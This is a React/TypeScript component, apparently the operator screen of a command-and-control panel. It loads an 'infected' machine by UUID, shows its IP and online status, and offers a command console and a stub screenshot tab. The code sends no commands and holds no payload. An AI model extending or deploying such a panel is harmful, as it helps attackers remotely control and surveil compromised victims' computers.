import React, {useEffect, useState} from "react"
import {useNavigate, useParams} from "react-router";
import type {Infected} from "../types/infected.ts";
import api from "../api/baseUrl.ts";
import {useTitle} from "../hooks/useTitle.ts";

export const InfectedWorkSpace: React.FC = () => {
    const params = useParams();
    const navigate = useNavigate();
    const [infected, setInfected] = useState<Infected>();
    const [page, setPage] = useState<number>(0);
    const [logs, setLogs] = useState<string[]>(["show ip address"]);
    const [input, setInput] = useState<string>("");
    useTitle("Infected Work Space");

    const obtainInfectedSystems = async () => {
        try {
            const response = await api.get("/infected/specificInfected", {
                params: { uuid: params.id },
            });

            setInfected(response.data as Infected);
            console.log(response.data);

        } catch (error) {
            if (error.response && error.response.status === 403) {
                navigate("/login");
            } else {
                console.error("There is some:", error);
            }
        }
    }

    const handleSendCommand = () => {
        if (!input.trim()) return;

        setLogs((prev) => [...prev, input]);
        setInput("");
    };

    useEffect(() => {
        obtainInfectedSystems();
    }, []);

    return (
        <>
            <div className="flex w-full  items-center justify-start gap-5 p-4">
                <h2 className="card-title text-lg font-mono">{infected?.latestIpAddress}</h2>
                <span className="font-mono p-1 bg-green-400 rounded-md text-white">Online</span>
            </div>
            <div className={"flex w-full p-6 space-x-6"}>
                <div className={"flex flex-col space-y-4 w-48 pr-4 pt-4"}>
                    {page !== 1 ?
                        <button className={"btn btn-lg btn-primary mb-4"} onClick={() => {setPage(1)}}>Command-Line</button>
                    :
                        <button className={"btn btn-lg bg-fuchsia-300 mb-4"} onClick={() => {setPage(1)}}>Command-Line</button>
                    }
                    {page !== 2 ?
                        <button className={"btn btn-lg btn-primary mb-4"} onClick={() => {setPage(2)}}>Screenshot</button>
                        :
                        <button className={"btn btn-lg bg-fuchsia-300 mb-4"} onClick={() => {setPage(2)}}>Screenshot</button>
                    }
                </div>
                {
                    page === 1 &&
                    <div className="flex-1 flex flex-col w-full max-w-[1250px] space-between">
                        <>
                            <div className="flex-1 min-h-[400px] max-h-[400px] w-full bg-gray-900 border border-gray-950 rounded-t-xl p-4 overflow-y-auto flex flex-col justify-end space-y-2 shadow-inner">
                                <div className="overflow-y-auto pr-2 space-y-2">
                                    {logs.map((log) => (
                                        <div
                                            className={`text-xl font-medium text-white font-mono text-base`}
                                        >
                                            {`> ${log}`}
                                        </div>
                                    ))}
                                </div>
                            </div>
                            <input
                                    type="text"
                                    placeholder="Type your command"
                                    value={input}
                                    onChange={(e) => setInput(e.target.value)}
                                    onKeyDown={(e) => {
                                        if (e.key === "Enter") {
                                            handleSendCommand()
                                        }
                                    }}
                                    className="w-full p-4 font-mono bg-gray-900 border border-gray-950 rounded-b-xl text-lg outline-none text-white placeholder-white focus:bg-slate-gray-700 transition-colors"
                            />
                        </>
                    </div>
                }
                {
                    page === 2 &&
                    <div>
                        <h1>Screenshot</h1>
                    </div>
                }
            </div>
        </>
    )
}